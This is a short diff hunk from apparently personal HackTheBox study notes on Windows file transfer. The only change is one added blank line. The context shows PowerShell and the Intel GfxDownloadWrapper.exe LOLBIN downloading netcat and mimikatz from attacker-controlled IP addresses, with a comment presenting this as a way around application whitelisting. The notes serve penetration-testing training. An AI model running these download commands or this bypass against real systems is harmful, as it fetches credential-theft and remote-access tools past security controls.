@@ -382,3 +382,4 @@ PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -Ou
 PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
 ```
 %% if application whitelisting has been implemented as a security control use  GfxDownloadWrapper.exe which is used by intel graphic driver or search for other LOLBIN "file download" binary in the lolbins link shared earlier %%
+
